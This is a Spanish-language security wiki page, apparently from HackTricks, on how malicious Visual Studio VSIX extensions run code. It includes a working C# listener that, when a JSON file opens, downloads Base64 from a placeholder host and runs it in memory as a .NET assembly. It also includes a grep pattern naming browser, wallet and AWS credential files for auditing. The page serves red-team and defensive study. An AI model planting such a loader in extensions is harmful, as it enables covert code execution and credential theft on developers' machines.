# Abuso de extensiones VSIX de Visual Studio

{{#include ../banners/hacktricks-training.md}}

Una extensión de Visual Studio puede convertir la actividad rutinaria en el editor en ejecución de código con la identidad del usuario que inició sesión. Un VSIX malicioso, un publisher que suplanta a otro o una actualización comprometida de una extensión pueden llegar a ese usuario a través de canales de instalación normales. Instalar con una solicitud de administrador es una vía de instalación con consentimiento, no una escalada automática de privilegios.<sup>[[1]](#references)</sup>

## Modelo de ejecución

Las extensiones clásicas de VSSDK suelen ejecutarse dentro de `devenv.exe`. El modelo más reciente `VisualStudio.Extensibility` ejecuta principalmente las extensiones modernas de .NET fuera del proceso: Visual Studio deriva las llamadas a un proceso dedicado `Microsoft.ServiceHub.Host.Extensibility`, lo que aísla la estabilidad del IDE, pero **no** crea un sandbox que aísle la extensión de los permisos de Windows del usuario. El nombre exacto del ejecutable puede incluir un sufijo de arquitectura, como `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Activación durante la actividad habitual en el editor

En lugar de exponer únicamente un comando de menú llamativo, una extensión puede implementar `ITextViewOpenClosedListener`. Su callback `TextViewOpenedAsync` se invoca para los documentos que coinciden, mientras que `TextViewExtensionConfiguration.AppliesTo` puede restringir la activación a un tipo común, como JSON. Un formatter o linter legítimo puede seguir realizando la función anunciada mientras una segunda acción se ejecuta como efecto secundario al abrir un archivo.<sup>[[1]](#references)[[3]](#references)</sup>

El siguiente patrón reducido muestra los puntos de ejecución importantes; omite el formatter legítimo y el manejo de errores para mayor claridad.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Cargador de ensamblados administrados en memoria activado por eventos</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Esta cadena descarga texto Base64, lo decodifica en bytes de ensamblado, lo carga desde un `MemoryStream` mediante un `AssemblyLoadContext` descartable, invoca el `EntryPoint` reflejado con cero parámetros o con un `string[]`, espera los puntos de entrada asíncronos y descarga el contexto. La segunda etapa no se escribe en disco, aunque el VSIX y la DLL principal de la extensión siguen siendo artefactos en disco. Base64 no proporciona autenticidad ni confidencialidad; el uso de HTTP también permite que un atacante en ruta sustituya la respuesta.<sup>[[1]](#references)</sup>

Las variaciones operativas incluyen suprimir todas las excepciones para que la función anunciada siga funcionando si falla el staging, o usar `ITextViewChangedListener` para activarla después de editar. El código se ejecuta en el host de extensiones y puede usar las API administradas, P/Invoke, archivos, credenciales y procesos secundarios disponibles para ese usuario.<sup>[[1]](#references)</sup>

Para ver una superficie de ejecución relacionada y específica del editor, basada en la carga automática de plugins nativos, consulta:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Abuso de la confianza en Marketplace y la entrega

Un VSIX puede llegar como archivo compartido directamente o mediante phishing, desde el Marketplace web o a través del navegador de Marketplace integrado en Visual Studio. Un registro de publicador que principalmente aplica unicidad y una lista de palabras reservadas puede permitir identidades de publicador visualmente sugerentes; comprometer un publicador o una extensión que ya goza de confianza es aún más eficaz, porque hereda una base de usuarios instalada. La instalación desde Marketplace invoca Visual Studio Installer y coloca temporalmente el VSIX descargado en `%LOCALAPPDATA%\Temp`; `payload.vsix` también se usa legítimamente, por lo que el nombre de archivo por sí solo no es un indicador.<sup>[[1]](#references)</sup>

MDSec no identificó un protocolo URL de Visual Studio que instalara directamente una extensión. Aun así, un operador necesita que el usuario instale o confíe en el VSIX, o debe comprometer la ruta de distribución de una extensión existente. Un paquete `AllUsers` se instala en la carpeta de instalación de Visual Studio y puede solicitar elevación, pero esto es un comportamiento normal del instalador con consentimiento, no una vía automática para obtener privilegios de administrador o SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Auditoría estática a escala

Los paquetes VSIX suelen ser contenedores ZIP, así que un pipeline seguro de revisión de Marketplace puede enumerar los paquetes, desempaquetarlos **sin cargar el código de la extensión**, analizar los manifiestos, identificar superficies ejecutables y descompilar ensamblados administrados con `ilspycmd`. Prioriza los ensamblados propios de la extensión después de excluir las dependencias comunes empaquetadas, y luego correlaciona las cadenas de almacenes de credenciales con grupos de comportamiento como lectura de archivos más envío por red, codificación más envío, descarga más ejecución, acceso al administrador de credenciales más acceso a la red, o captura de pantalla más envío.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

También inventaría las DLL nativas, los targets de MSBuild, los scripts, las plantillas T4 y las cargas útiles del instalador, en lugar de asumir que todas las superficies de ejecución son código administrado. Compara el comportamiento sospechoso con el propósito declarado en el manifiesto; la telemetría y los actualizadores legítimos pueden parecer exfiltración o staging. Una revisión exclusivamente estática no detecta código empaquetado, ofuscado, resuelto dinámicamente o inactivo, y revisar solo la versión más reciente pasa por alto versiones históricas maliciosas.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Extensions revisadas](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Acerca de VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomía de un paquete VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - Herramienta .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
